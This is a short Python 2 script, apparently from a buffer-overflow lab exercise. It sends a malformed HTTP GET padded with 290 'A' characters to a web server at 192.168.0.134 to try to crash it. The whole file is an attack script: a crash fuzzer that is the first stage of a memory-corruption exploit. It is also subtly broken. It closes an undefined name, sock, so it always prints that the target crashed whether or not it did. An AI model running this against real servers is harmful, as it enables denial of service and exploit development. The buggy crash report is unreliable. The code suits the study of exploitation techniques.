#!/usr/bin/python
import sys,socket


buffer = "A" * 290
eob='\r\n\r\n'


try: 
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(('192.168.0.134',80))
   print "Trying with buffer length %d" % len(buffer)
   s.send('GET' + " /%" + buffer+ eob)
   sock.close()

except: 
       print("Fuzzing Crashed at %s by" % str(len(buffer)))
       sys.exit()  